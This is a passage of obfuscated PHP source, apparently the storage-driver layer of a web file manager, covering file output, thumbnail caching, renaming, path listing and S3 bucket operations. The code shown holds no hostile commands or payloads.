} } } } public function fileOutServer($ØÂˆ©°„, $½İ¿ş¬ = false, $‹´Áğ‹ = false, $ãïƒ•† = '') { $this->fileOut($ØÂˆ©°„, $½İ¿ş¬, $‹´Áğ‹, $ãïƒ•†); } public function fileOutLink($Ã™ŠÂş‚) { header($_SERVER[¢ñàß¿€][175] . $Ã™ŠÂş‚); die; } public function cacheMethod($™ïøßË, $‚´§“à, $µ–¥é– = null) { $ëÎŞ©æá =& $_SERVER[¢ñàß¿€]; static $ªÙ£²…¨ = array(); $ŒŠğÒ­Í = $‚´§“à ? ltrim($this->getPathOuter($‚´§“à), $ëÎŞ©æá[8]) : $ëÎŞ©æá[12]; $æ©Êü„‰ = $ëÎŞ©æá[176] . $™ïøßË . $ëÎŞ©æá[177] . rtrim($ŒŠğÒ­Í, $ëÎŞ©æá[8]); if (is_null($™ïøßË)) { $ªÙ£²…¨ = array(); return; } if (is_null($‚´§“à)) { foreach ($ªÙ£²…¨ as $æ©Êü„‰ => $©Õ˜´Ø‚) { if (!strstr($æ©Êü„‰, $ëÎŞ©æá[176] . $™ïøßË . $ëÎŞ©æá[178])) { continue; } unset($ªÙ£²…¨[$æ©Êü„‰]); } return; } if (!is_null($µ–¥é–)) { $ªÙ£²…¨[$æ©Êü„‰] = $µ–¥é–; return; } $Â¼¹‘ƒ = isset($ªÙ£²…¨[$æ©Êü„‰]) ? $ªÙ£²…¨[$æ©Êü„‰] : null; if (!is_null($Â¼¹‘ƒ)) { return $Â¼¹‘ƒ; } $Â¼¹‘ƒ = $this->{$™ïøßË}($‚´§“à); $ªÙ£²…¨[$æ©Êü„‰] = $Â¼¹‘ƒ; return $Â¼¹‘ƒ; } public function cacheMethodInfoSet($ıãÂ¤€ù, $Ô ³„î“, $ÉŠ½Ì‹Ô = false) { $×„È’³‹ =& $_SERVER[¢ñàß¿€]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($×„È’³‹[179], $ıãÂ¤€ù, $Ô ³„î“); $this->cacheMethod($×„È’³‹[180], $ıãÂ¤€ù, $Ô ³„î“ ? !1 : !0); if (is_array($ÉŠ½Ì‹Ô)) { $this->cacheMethod($×„È’³‹[181], $ıãÂ¤€ù, $ÉŠ½Ì‹Ô); } } public function fileOutImage($‘óœœßÜ, $œ¢ü¯çû = 250) { $óÜáßÚå =& $_SERVER[¢ñàß¿€]; set_timeout(); if (substr($‘óœœßÜ, 0, 4) == $óÜáßÚå[152]) { $this->fileOutLink($‘óœœßÜ); } $¡‘¸şÏ® = $this->info($‘óœœßÜ); $¸¶Éàãó = !1; $Íéøˆ¬ = isset($GLOBALS[$óÜáßÚå[182]]) ? $GLOBALS[$óÜáßÚå[182]] : array(); if ($Íéøˆ¬ && $Íéøˆ¬[$óÜáßÚå[183]] == $¡‘¸şÏ®[$óÜáßÚå[87]]) { $¡‘¸şÏ® = $Íéøˆ¬; $Ú¤æ¼§à = $¡‘¸şÏ®[$óÜáßÚå[184]]; if ($Ú¤æ¼§à && isset($Ú¤æ¼§à[$óÜáßÚå[185]])) { if ($Ú¤æ¼§à[$óÜáßÚå[185]] <= $œ¢ü¯çû && $Ú¤æ¼§à[$óÜáßÚå[186]] <= $œ¢ü¯çû) { $¸¶Éàãó = !0; } } } if ($¡‘¸şÏ®[$óÜáßÚå[79]] <= 1024 * 50 || $¸¶Éàãó || !function_exists($óÜáßÚå[187]) || $¡‘¸şÏ®[$óÜáßÚå[169]] == $óÜáßÚå[188]) { return $this->fileOut($‘óœœßÜ, !1, $¡‘¸şÏ®[$óÜáßÚå[32]]); } $µ…É†¿ = kodIO::hashPath($¡‘¸şÏ®); $Ö™Ûø”‰ = "\x63\x6f\x76\145\x72\137{$µ…É†¿}\x5f{$œ¢ü¯çû}\x2e\160\156\x67"; $´š€Îõª = IO_PATH_SYSTEM_TEMP . $óÜáßÚå[189]; $Òò£êê× = IO::infoFullSimple($´š€Îõª); $‘¯¶ŒÀµ = $Òò£êê× && is_array($Òò£êê×) ? $Òò£êê×[$óÜáßÚå[87]] : $óÜáßÚå[12]; if (!$‘¯¶ŒÀµ) { $‘¯¶ŒÀµ = IO::mkdir($´š€Îõª); } if ($¡‘¸şÏ®[$óÜáßÚå[190]] == $óÜáßÚå[191] && isset($¡‘¸şÏ®[$óÜáßÚå[192]]) && $¡‘¸şÏ®[$óÜáßÚå[192]] == kodIO::sourceID($‘¯¶ŒÀµ)) { $†×³¥÷¿ = $¡‘¸şÏ®[$óÜáßÚå[193]]; if ($œ¢ü¯çû <= 500) { $ÂÜé»¢… = preg_replace($óÜáßÚå[194], $óÜáßÚå[195], $¡‘¸şÏ®[$óÜáßÚå[32]]); $†×³¥÷¿ = IO::fileNameExist($‘¯¶ŒÀµ, $ÂÜé»¢…); } return IO::fileOut(KodIO::make($†×³¥÷¿), !1, $¡‘¸şÏ®[$óÜáßÚå[32]]); } $¿§ã’£– = IO::fileNameExist($‘¯¶ŒÀµ, $Ö™Ûø”‰); if ($¿§ã’£–) { return IO::fileOut(KodIO::make($¿§ã’£–), !1, $¡‘¸şÏ®[$óÜáßÚå[32]]); } if ($œ¢ü¯çû > 1000) { $this->makeImageCover($‘¯¶ŒÀµ, $‘óœœßÜ, $Ö™Ûø”‰, $œ¢ü¯çû); $this->makeImageCover($‘¯¶ŒÀµ, $‘óœœßÜ, "\x63\x6f\166\145\162\x5f{$µ…É†¿}\137\x32\x35\x30\56\x70\x6e\x67", 250); $¿§ã’£– = IO::fileNameExist($‘¯¶ŒÀµ, $Ö™Ûø”‰); if ($¿§ã’£–) { return IO::fileOut(KodIO::make($¿§ã’£–), !1, $¡‘¸şÏ®[$óÜáßÚå[32]]); } die; } $›·Â»öÈ = Cache::get($Ö™Ûø”‰); if ($›·Â»öÈ == $óÜáßÚå[196] || $›·Â»öÈ == $óÜáßÚå[197]) { echo $›·Â»öÈ; die; } Cache::set($Ö™Ûø”‰, $óÜáßÚå[197], 60); $á„—Äƒ = array($‘¯¶ŒÀµ, $¡‘¸şÏ®[$óÜáßÚå[87]], $Ö™Ûø”‰, $œ¢ü¯çû); $°¶Û®Æé = $óÜáßÚå[198] . $¡‘¸şÏ®[$óÜáßÚå[79]] . $óÜáßÚå[199] . $Ö™Ûø”‰ . $óÜáßÚå[200] . $¡‘¸şÏ®[$óÜáßÚå[32]] . $óÜáßÚå[201] . $¡‘¸şÏ®[$óÜáßÚå[87]]; TaskQueue::add($óÜáßÚå[202], $á„—Äƒ, $°¶Û®Æé, $Ö™Ûø”‰); } public function makeImageCover($«õñ»“·, $³ÜÆ‘ö‘, $¡Û°á˜Ë, $Ã³Èñô‡) { $ËÌŸœÏÎ =& $_SERVER[¢ñàß¿€]; if (IO::fileNameExist($«õñ»“·, $¡Û°á˜Ë)) { return $ËÌŸœÏÎ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ë³ç¬· = DATA_THUMB . $¡Û°á˜Ë; del_file($ë³ç¬·); $”ŸûöŠö = TEMP_FILES . $¡Û°á˜Ë; if (!@file_exists($”ŸûöŠö)) { $”ŸûöŠö = $this->download($³ÜÆ‘ö‘, $”ŸûöŠö); } if (!@file_exists($”ŸûöŠö)) { return $ËÌŸœÏÎ[204]; } ImageThumb::createThumb($”ŸûöŠö, $ë³ç¬·, $Ã³Èñô‡, $Ã³Èñô‡ * 10); if (@file_exists($ë³ç¬·)) { Cache::remove($¡Û°á˜Ë); return IO::move($ë³ç¬·, $«õñ»“·); } Cache::set($¡Û°á˜Ë, $ËÌŸœÏÎ[196], 600); del_file($ë³ç¬·); return $ËÌŸœÏÎ[205] . $”ŸûöŠö . $ËÌŸœÏÎ[74]; } public function fileOutImageServer($îÀü– Ù, $İ›Š§öŞ = 250) { $this->fileOutImage($îÀü– Ù, $İ›Š§öŞ); } public function fileNameAuto($Ã‘ÙÕİ», $ˆÁë——œ, $‰•›©ü® = REPEAT_RENAME, $²½şğŸ¤ = false) { $¥‹óá€Ú =& $_SERVER[¢ñàß¿€]; $°åø†Ş = $Ã‘ÙÕİ» === $¥‹óá€Ú[12] ? $ˆÁë——œ : rtrim($Ã‘ÙÕİ», $¥‹óá€Ú[8]) . $¥‹óá€Ú[8] . $ˆÁë——œ; if ($‰•›©ü® == REPEAT_REPLACE || !$this->exist($°åø†Ş) || $²½şğŸ¤ && $‰•›©ü® != REPEAT_RENAME_FOLDER) { return $ˆÁë——œ; } if ($‰•›©ü® == REPEAT_SKIP) { return !1; } $¥—™¼×½ = $¥‹óá€Ú[10] . get_path_ext($ˆÁë——œ); $¥—™¼×½ = $¥—™¼×½ == $¥‹óá€Ú[10] || $²½şğŸ¤ ? $¥‹óá€Ú[12] : $¥—™¼×½; $ğ£·¢ ì = 1; $ğ·óÈÄÀ = substr($ˆÁë——œ, 0, strlen($ˆÁë——œ) - strlen($¥—™¼×½)); $ĞäøĞ› = $ğ·óÈÄÀ . "\x28{$ğ£·¢ ì}\51{$¥—™¼×½}"; while ($this->exist(rtrim($Ã‘ÙÕİ», $¥‹óá€Ú[8]) . $¥‹óá€Ú[8] . $ĞäøĞ›)) { $ĞäøĞ› = $ğ·óÈÄÀ . "\50{$ğ£·¢ ì}\51{$¥—™¼×½}"; $ğ£·¢ ì++; } return $ĞäøĞ›; } private function fileNameAutoList($½ÌêŠ¦¢, $µ½æç´Á, $¾„õÏœá = false) { $ÙØ’§ˆ± =& $_SERVER[¢ñàß¿€]; $ÚÇ£ˆ”Ğ = $this->listPath($½ÌêŠ¦¢, !0); $ÚÇ£ˆ”Ğ = array_merge($ÚÇ£ˆ”Ğ[$ÙØ’§ˆ±[85]], $ÚÇ£ˆ”Ğ[$ÙØ’§ˆ±[86]]); $¦ÙäŞé§ = array_to_keyvalue($ÚÇ£ˆ”Ğ, $ÙØ’§ˆ±[12], $ÙØ’§ˆ±[32]); $´»²È¶¸ = $ÙØ’§ˆ±[10] . get_path_ext($µ½æç´Á); $´»²È¶¸ = $´»²È¶¸ == $ÙØ’§ˆ±[10] || $¾„õÏœá ? $ÙØ’§ˆ±[12] : $´»²È¶¸; $¢õƒ«•™ = substr($µ½æç´Á, 0, strlen($µ½æç´Á) - strlen($´»²È¶¸)); $£ùÑ‚ñ© = $¢õƒ«•™ . "\50\x30\51{$´»²È¶¸}"; for ($õá·‡ = 1; $õá·‡ <= count($¦ÙäŞé§) + 1; $õá·‡++) { $£ùÑ‚ñ© = $¢õƒ«•™ . "\x28{$õá·‡}\x29{$´»²È¶¸}"; if (!in_array_not_case($£ùÑ‚ñ©, $¦ÙäŞé§)) { return $£ùÑ‚ñ©; } } return $£ùÑ‚ñ©; } public function listAllFiles($ºòíÛÔø, $ò¼óÉØµ) { $ãì„Ã  =& $_SERVER[¢ñàß¿€]; if (empty($ò¼óÉØµ)) { return array(); } $¥­öÁñï = array_keys($ò¼óÉØµ); $—œ¨ªù = array(); $ºòíÛÔø = trim($ºòíÛÔø, $ãì„Ã [8]); foreach ($ò¼óÉØµ as $¢¶Ó€¸ => $ÄÙ°¢ûÏ) { $‚•ğ¦ô… = ltrim(substr(trim($¢¶Ó€¸, $ãì„Ã [8]), strlen($ºòíÛÔø)), $ãì„Ã [8]); if (substr($¢¶Ó€¸, -1) == $ãì„Ã [8]) { $‚•ğ¦ô… = rtrim($‚•ğ¦ô…, $ãì„Ã [8]) . $ãì„Ã [8]; } $—œ¨ªù = array_merge($—œ¨ªù, $this->slicePath($‚•ğ¦ô…)); } $®ØÇªè = array(); foreach (array_unique($—œ¨ªù) as $Äò˜‘úµ) { $¹„«çö’ = array($ãì„Ã [87] => $this->getPathOuter($ãì„Ã [8] . $ºòíÛÔø . $ãì„Ã [8] . $Äò˜‘úµ), $ãì„Ã [78] => 1, $ãì„Ã [79] => 0); if (substr($Äò˜‘úµ, -1) != $ãì„Ã [8]) { $¹„«çö’[$ãì„Ã [78]] = 0; $ŒËÛÓ±§ = $this->getPath($ºòíÛÔø . $ãì„Ã [8] . $Äò˜‘úµ); if (isset($ò¼óÉØµ[$ŒËÛÓ±§])) { $Ø»Şƒ® = $ò¼óÉØµ[$ŒËÛÓ±§]; if (isset($Ø»Şƒ®[$ãì„Ã [79]])) { $¹„«çö’[$ãì„Ã [79]] = intval($Ø»Şƒ®[$ãì„Ã [79]]); } if (isset($Ø»Şƒ®[$ãì„Ã [206]])) { $¹„«çö’[$ãì„Ã [88]] = intval($Ø»Şƒ®[$ãì„Ã [206]]); } } } $®ØÇªè[] = $¹„«çö’; } return $®ØÇªè; } public function slicePath($¿úĞñõ‚) { $°ö·â² =& $_SERVER[¢ñàß¿€]; $ì ¼©Æ = explode($°ö·â²[8], trim($¿úĞñõ‚, $°ö·â²[8])); $õ›Ãä¬Ü = 0; do { ++$õ›Ãä¬Ü; $Äéı²Ó[] = implode($°ö·â²[8], array_slice($ì ¼©Æ, 0, $õ›Ãä¬Ü)) . $°ö·â²[8]; } while ($õ›Ãä¬Ü < count($ì ¼©Æ)); $Äéı²Ó[count($ì ¼©Æ) - 1] = $¿úĞñõ‚; return $Äéı²Ó; } public function getHost() { $ë§·µÉá =& $_SERVER[¢ñàß¿€]; $˜—õâù = parse_url(trim($this->domain, $ë§·µÉá[8])); $—Ş¤™éü = isset($˜—õâù[$ë§·µÉá[207]]) ? $˜—õâù[$ë§·µÉá[207]] : http_type(); $—«Ñô±¹ = isset($˜—õâù[$ë§·µÉá[208]]) ? $˜—õâù[$ë§·µÉá[208]] : $˜—õâù[$ë§·µÉá[87]]; if (isset($˜—õâù[$ë§·µÉá[209]])) { $—«Ñô±¹ .= $ë§·µÉá[4] . $˜—õâù[$ë§·µÉá[209]]; } return $—Ş¤™éü . $ë§·µÉá[210] . $—«Ñô±¹; } public function pathEncode($–ë±ÔÎˆ) { $½ûÛìÒ¾ =& $_SERVER[¢ñàß¿€]; return str_replace($½ûÛìÒ¾[211], $½ûÛìÒ¾[8], rawurlencode($–ë±ÔÎˆ)); } public function writeLog($Üø±ÍÆœ = '', $…ÕíòÃõ = false) { $…ŒàÂ·¬ =& $_SERVER[¢ñàß¿€]; $´­ºÄÛ´ = in_array(ACTION, array($…ŒàÂ·¬[212], $…ŒàÂ·¬[213])); if (!$´­ºÄÛ´ && !GLOBAL_DEBUG) { return; } $üõ—ƒ»ş = $Üø±ÍÆœ; static $¥÷Õ»¢ = null; if (!$¥÷Õ»¢) { $¥÷Õ»¢ = strtoupper($this->getType()); } $Üø±ÍÆœ = $¥÷Õ»¢ . $…ŒàÂ·¬[214] . $Üø±ÍÆœ; if ($…ÕíòÃõ) { $ó·ªåá¡ = error_get_last(); if ($ó·ªåá¡) { $Üø±ÍÆœ = array($Üø±ÍÆœ, $ó·ªåá¡); } } write_log($Üø±ÍÆœ, $…ŒàÂ·¬[215]); if ($´­ºÄÛ´) { throw new Exception($üõ—ƒ»ş); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($‰ƒÇ•”) { set_timeout(); require_once SDK_DIR . $_SERVER[¢ñàß¿€][216]; parent::__construct(); $this->_init($‰ƒÇ•”); } public function _init($½êœø÷) { $¥ƒ¸Ê‹è =& $_SERVER[¢ñàß¿€]; $this->config = $½êœø÷; foreach ($½êœø÷ as $¿ªŞ±œ„ => $•Â¿ş°×) { if (isset($this->{$¿ªŞ±œ„})) { $this->{$¿ªŞ±œ„} = $•Â¿ş°×; } } $this->endpoint = $½êœø÷[$¥ƒ¸Ê‹è[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($¥ƒ¸Ê‹è[212], $¥ƒ¸Ê‹è[213]))) { $this->client->setExceptions(); } } public function setSignVersion($üú¥”¦É = "\x76\x34") { $this->signVer = $üú¥”¦É; $this->client->setSignatureVersion($üú¥”¦É); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $šÑäœ½·) { return null; } } public function isBucketCors() { $ŠÜ§¨ıÍ =& $_SERVER[¢ñàß¿€]; $áí×Èø = $this->getBucketCors(); if (!$áí×Èø || !is_array($áí×Èø)) { return !1; } if (!is_array($áí×Èø[$ŠÜ§¨ıÍ[218]])) { $áí×Èø[$ŠÜ§¨ıÍ[218]] = explode($ŠÜ§¨ıÍ[50], $áí×Èø[$ŠÜ§¨ıÍ[218]]); } if ($áí×Èø[$ŠÜ§¨ıÍ[219]] != $ŠÜ§¨ıÍ[220] || !in_array($ŠÜ§¨ıÍ[220], $áí×Èø[$ŠÜ§¨ıÍ[218]])) { return !1; } $š‰´øô = array_map($ŠÜ§¨ıÍ[221], $áí×Èø[$ŠÜ§¨ıÍ[222]]); if (!is_array($š‰´øô)) { $š‰´øô = array(); } $Æú­Öı = array($ŠÜ§¨ıÍ[223], $ŠÜ§¨ıÍ[224], $ŠÜ§¨ıÍ[225], $ŠÜ§¨ıÍ[226], $ŠÜ§¨ıÍ[227]); $ËİÎ“íÈ = array_diff($Æú­Öı, $š‰´øô); return empty($ËİÎ“íÈ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ãšòÍ„, $úùĞş‹Œ = '', $‘ÀŞÅóÃ = REPEAT_RENAME) { $¨¦ƒÇ§Ò = $this->setContent($ãšòÍ„, $úùĞş‹Œ); if ($¨¦ƒÇ§Ò !== !1) { return $this->getPathOuter($ãšòÍ„); } return !1; } public function mkdir($ªßÂ»§ë, $§ÑÎü = REPEAT_SKIP) { $®ÚÉ¶ø =& $_SERVER[¢ñàß¿€]; if (empty($ªßÂ»§ë) && $ªßÂ»§ë !== $®ÚÉ¶ø[228]) { return !1; } if ($§ÑÎü && $this->_isFolder($ªßÂ»§ë)) { return $this->getPathOuter($ªßÂ»§ë); } $ô“›˜Òç = $this->setContent($ªßÂ»§ë, $®ÚÉ¶ø[12], !0); if ($ô“›˜Òç !== !1) { return $this->getPathOuter($ªßÂ»§ë); } return !1; } public function copyFile($¸ìçŒÏ, $ÈÃ•…’Ê, $¥¥õ±Õå = array()) { $ÌÇ¤» Ş =& $_SERVER[¢ñàß¿€]; $ê…õØß¨ = $this->objectMeta($¸ìçŒÏ); if (!$ê…õØß¨) { return !1; } if ($ê…õØß¨[$ÌÇ¤» Ş[79]] <= 1024 * 1024 * 200) { $ñªôÑÍ = $this->client->copyObject($this->bucket, $¸ìçŒÏ, $this->bucket, $ÈÃ•…’Ê, $ÌÇ¤» Ş[229], $¥¥õ±Õå); } else { $ñªôÑÍ = $this->client->multiCopyObject($this->bucket, $¸ìçŒÏ, $this->bucket, $ÈÃ•…’Ê, $¥¥õ±Õå); } $ñªôÑÍ = $ñªôÑÍ ? $this->getPathOuter($ÈÃ•…’Ê) : !1; return $ñªôÑÍ; } public function moveFile($»›ÛÅ, $†Ÿî²¿É) { if ($this->copyFile($»›ÛÅ, $†Ÿî²¿É)) { $this->delFile($»›ÛÅ); return $this->getPathOuter($†Ÿî²¿É); } return !1; } public function delFile($ş„¨—¥á) { return $this->client->deleteObject($this->bucket, $ş„¨—¥á); } public function delFolder($×¿´£¦) { $„®û¼éí =& $_SERVER[¢ñàß¿€]; if (!$this->exist($×¿´£¦)) { return !0; } $this->listItemCache = !1; $×Ú“Öä˜ = $this->fileList($×¿´£¦); $this->listItemCache = !0; $î¾ïãèæ = trim($×¿´£¦, $„®û¼éí[8]) . $„®û¼éí[8]; if (!empty($×¿´£¦) && $×¿´£¦ !== $„®û¼éí[228] && !in_array($î¾ïãèæ, $×Ú“Öä˜[$„®û¼éí[85]])) { $×Ú“Öä˜[$„®û¼éí[85]][] = $î¾ïãèæ; } $Ø˜»½’ = $this->delByBatch($×Ú“Öä˜[$„®û¼éí[86]]); if (!$Ø˜»½’) { return !1; } $Ø˜»½’ = $this->delByBatch($×Ú“Öä˜[$„®û¼éí[85]]); if (!$Ø˜»½’) { return !1; } return $this->delFile($î¾ïãèæ); } private function delByBatch($Í½¢¹Â¨) { foreach (array_chunk($Í½¢¹Â¨, 1000) as $™âÙ ¿) { $ËóÔÆß = $this->client->deleteObjects($this->bucket, $™âÙ ¿); if (!$ËóÔÆß) { return !1; } } return !0; } public function rename($ÜÂû…°­, $âøä‚°) { return $this->renameObject($ÜÂû…°­, $âøä‚°); } public function listPath($ğãıÂ³À, $…îìÆ›ì = false) { $Ÿºåç“î =& $_SERVER[¢ñàß¿€]; $äƒ§Ó×µ = $this->fileList($ğãıÂ³À, $Ÿºåç“î[8], !0); foreach ($äƒ§Ó×µ[$Ÿºåç“î[85]] as $Æ»•²´Ã => $Ğô”õÌÀ) { $äƒ§Ó×µ[$Ÿºåç“î[85]][$Æ»•²´Ã] = $this->folderInfo($Ğô”õÌÀ, $…îìÆ›ì, $Ğô”õÌÀ); } foreach ($äƒ§Ó×µ[$Ÿºåç“î[86]] as $Æ»•²´Ã => $Ğô”õÌÀ) { $äƒ§Ó×µ[$Ÿºåç“î[86]][$Æ»•²´Ã] = $this->fileInfo($Ğô”õÌÀ[$Ÿºåç“î[32]], $…îìÆ›ì, $Ğô”õÌÀ); } return $äƒ§Ó×µ; } protected function infoChildren($çó§œèÇ, &$Õ“¨¾ıà) { $´‹‹¯“Ş =& $_SERVER[¢ñàß¿€]; $°ŒšÈš = $this->fileList($çó§œèÇ, $´‹‹¯“Ş[12], !0); $Õ“¨¾ıà[$´‹‹¯“Ş[81]] += count($°ŒšÈš[$´‹‹¯“Ş[85]]); $Õ“¨¾ıà[$´‹‹¯“Ş[80]] += count($°ŒšÈš[$´‹‹¯“Ş[86]]); foreach ($°ŒšÈš[$´‹‹¯“Ş[86]] as $ÈÂÍ¬åà) { if (!$ÈÂÍ¬åà || !$ÈÂÍ¬åà[$´‹‹¯“Ş[79]]) { continue; } $Õ“¨¾ıà[$´‹‹¯“Ş[79]] += $ÈÂÍ¬åà[$´‹‹¯“Ş[79]]; } } private function fileInfo($ÇÏ¦œ‹, $ĞÊŒŒìÈ = false, $şşÒÑòÉ = array()) { $ºËñİÚ© =& $_SERVER[¢ñàß¿€]; $Ú„¢å±à = array($ºËñİÚ©[32] => $this->pathThis($ÇÏ¦œ‹), $ºËñİÚ©[87] => $this->getPathOuter($ÇÏ¦œ‹), $ºËñİÚ©[33] => $ºËñİÚ©[230], $ºËñİÚ©[169] => $this->ext($ÇÏ¦œ‹), $ºËñİÚ©[79] => isset($şşÒÑòÉ[$ºËñİÚ©[79]]) ? $şşÒÑòÉ[$ºËñİÚ©[79]] : 0); if ($ĞÊŒŒìÈ) { return $Ú„¢å±à; } $Ú„¢å±à[$ºËñİÚ©[231]] = $Ú„¢å±à[$ºËñİÚ©[88]] = 0; $Ú„¢å±à[$ºËñİÚ©[232]] = $Ú„¢å±à[$ºËñİÚ©[233]] = !0; if (empty($şşÒÑòÉ)) { $şşÒÑòÉ = $this->objectMeta($ÇÏ¦œ‹); if (!$şşÒÑòÉ) { return $Ú„¢å±à; } } if (isset($şşÒÑòÉ[$ºËñİÚ©[234]]) && $şşÒÑòÉ[$ºËñİÚ©[234]]) { $Ú„¢å±à[$ºËñİÚ©[235]] = $şşÒÑòÉ[$ºËñİÚ©[234]]; } if (isset($şşÒÑòÉ[$ºËñİÚ©[206]])) { $Ú„¢å±à[$ºËñİÚ©[88]] = $şşÒÑòÉ[$ºËñİÚ©[206]]; } if (isset($şşÒÑòÉ[$ºËñİÚ©[79]])) { $Ú„¢å±à[$ºËñİÚ©[79]] = $şşÒÑòÉ[$ºËñİÚ©[79]]; } return $Ú„¢å±à; } private function folderInfo($ƒÜ úµ, $¤™óæèò = false, $¹ÙÉ¨¶ª = array()) { $‘Ó·ÛÆĞ =& $_SERVER[¢ñàß¿€]; $ãÃ¦¯ = array($‘Ó·ÛÆĞ[32] => $this->pathThis($ƒÜ úµ), $‘Ó·ÛÆĞ[87] => $this->getPathOuter($‘Ó·ÛÆĞ[8] . $ƒÜ úµ), $‘Ó·ÛÆĞ[33] => $‘Ó·ÛÆĞ[78]); if ($¤™óæèò) { return $ãÃ¦¯; } $ãÃ¦¯[$‘Ó·ÛÆĞ[231]] = $ãÃ¦¯[$‘Ó·ÛÆĞ[88]] = 0; $ãÃ¦¯[$‘Ó·ÛÆĞ[232]] = $ãÃ¦¯[$‘Ó·ÛÆĞ[233]] = !0; if ($ƒÜ úµ == $‘Ó·ÛÆĞ[12]) { return $ãÃ¦¯; } if (empty($¹ÙÉ¨¶ª)) { $¹ÙÉ¨¶ª = $this->objectMeta(trim($ƒÜ úµ, $‘Ó·ÛÆĞ[8]) . $‘Ó·ÛÆĞ[8]); } if (isset($¹ÙÉ¨¶ª[$‘Ó·ÛÆĞ[206]])) { $ãÃ¦¯[$‘Ó·ÛÆĞ[231]] = $¹ÙÉ¨¶ª[$‘Ó·ÛÆĞ[206]]; } return $ãÃ¦¯; } private function fileList($å÷´­†µ, $†‰èÇüÍ = '', $È˜„Ã¦ã = 0) { $ÜÇø£ş =& $_SERVER[¢ñàß¿€]; $¶ÒâèíÜ = rtrim($å÷´­†µ, $ÜÇø£ş[8]) . $ÜÇø£ş[8]; $¨“ËØÇ¥ = $this->listObjs($¶ÒâèíÜ, null, null, $†‰èÇüÍ); if (!$¨“ËØÇ¥) { return array($ÜÇø£ş[85] => array(), $ÜÇø£ş[86] => array()); } $‹’‘•‘ = $Û¯Ç°ùÓ = array(); foreach ($¨“ËØÇ¥[$ÜÇø£ş[236]] as $ÂíÄÏ¼Ú) { $Ô»¤Àœ = $ÂíÄÏ¼Ú[$ÜÇø£ş[32]]; if ($Ô»¤Àœ == $¶ÒâèíÜ) { continue; } $äËñÄŠ = isset($ÂíÄÏ¼Ú[$ÜÇø£ş[79]]) ? $ÂíÄÏ¼Ú[$ÜÇø£ş[79]] : 0; $ñ™çéß = $äËñÄŠ == 0 && substr($Ô»¤Àœ, strlen($Ô»¤Àœ) - 1, 1) == $ÜÇø£ş[8] ? !0 : !1; $this->cacheMethodInfoSet($Ô»¤Àœ, $ñ™çéß, $ÂíÄÏ¼Ú); if ($ñ™çéß) { $‹’‘•‘[] = $Ô»¤Àœ; continue; } $Û¯Ç°ùÓ[] = $È˜„Ã¦ã ? $ÂíÄÏ¼Ú : $Ô»¤Àœ; } foreach ($¨“ËØÇ¥[$ÜÇø£ş[237]] as $ÂíÄÏ¼Ú) { $‹’‘•‘[] = $ÂíÄÏ¼Ú[$ÜÇø£ş[32]]; $this->cacheMethodInfoSet($ÂíÄÏ¼Ú[$ÜÇø£ş[32]], !0); } $this->cacheMethodInfoSet($å÷´­†µ, !0); return array($ÜÇø£ş[85] => $‹’‘•‘, $ÜÇø£ş[86] => $Û¯Ç°ùÓ); } private function listObjs($±°õ€Â‰, $—“¢Ñã€ = null, $îË¼·¾ü = null, $‚íâµóâ = null) { $À„‚Ê›ã =& $_SERVER[¢ñàß¿€]; $±°õ€Â‰ = trim($±°õ€Â‰, $À„‚Ê›ã[8]); $îã€³€é = empty($±°õ€Â‰) && $±°õ€Â‰ !== $À„‚Ê›ã[228] ? $À„‚Ê›ã[12] : $±°õ€Â‰ . $À„‚Ê›ã[8]; return $this->client->getBucket($this->bucket, $îã€³€é, $—“¢Ñã€, $îË¼·¾ü, $‚íâµóâ, !0); } public function has($÷ÀøÜó‚, $¨¿’Æâã = false, $™¡ëÏƒ› = true) { $Ñî¾æÅ =& $_SERVER[¢ñàß¿€]; $÷ÀøÜó‚ = trim($÷ÀøÜó‚, $Ñî¾æÅ[8]); $ß¦Á¢Ê = empty($÷ÀøÜó‚) && $÷ÀøÜó‚ !== $Ñî¾æÅ[228] ? $Ñî¾æÅ[12] : $÷ÀøÜó‚ . $Ñî¾æÅ[8]; $³§‡à¹š = null; $†ú”Ÿµã = 500; $§îæĞ”³ = $Ñî¾æÅ[8]; $¨µ„¤ÄĞ = $›à•‹¡Ä = array(); while (!0) { $©‡î’Â… = $this->listObjs($÷ÀøÜó‚, $³§‡à¹š, $†ú”Ÿµã, $§îæĞ”³); if (!$©‡î’Â…) { break; } $³§‡à¹š = $©‡î’Â…[$Ñî¾æÅ[238]]; $¸ÏìŒÉë = $©‡î’Â…[$Ñî¾æÅ[236]]; $¤ûŸàÜ = $©‡î’Â…[$Ñî¾æÅ[237]]; if (empty($¸ÏìŒÉë) && empty($¤ûŸàÜ)) { break; } if (count($¸ÏìŒÉë) == 1 && $¸ÏìŒÉë[0][$Ñî¾æÅ[32]] == $ß¦Á¢Ê) { break; } if ($¨¿’Æâã) { if (count($¸ÏìŒÉë)) { $¸ÏìŒÉë = array_column($¸ÏìŒÉë, $Ñî¾æÅ[32]); $¨µ„¤ÄĞ = array_merge($¨µ„¤ÄĞ, $¸ÏìŒÉë); } if (count($¤ûŸàÜ)) { $¤ûŸàÜ = array_column($¤ûŸàÜ, $Ñî¾æÅ[32]); $›à•‹¡Ä = array_merge($›à•‹¡Ä, $¤ûŸàÜ); } if ($³§‡à¹š === null) { break; } continue; } if ($™¡ëÏƒ›) { if (!empty($¸ÏìŒÉë)) { if (count($¸ÏìŒÉë) > 1 || isset($¸ÏìŒÉë[0][$Ñî¾æÅ[32]]) && $¸ÏìŒÉë[0][$Ñî¾æÅ[32]] != $ß¦Á¢Ê) { return !0; } } } else { if (!empty($¤ûŸàÜ)) { return !0; } } if ($³§‡à¹š === null) { break; } } if ($¨¿’Æâã) { $¨µ„¤ÄĞ = array_diff($¨µ„¤ÄĞ, array($ß¦Á¢Ê)); $¨µ„¤ÄĞ = count(array_unique($¨µ„¤ÄĞ)); 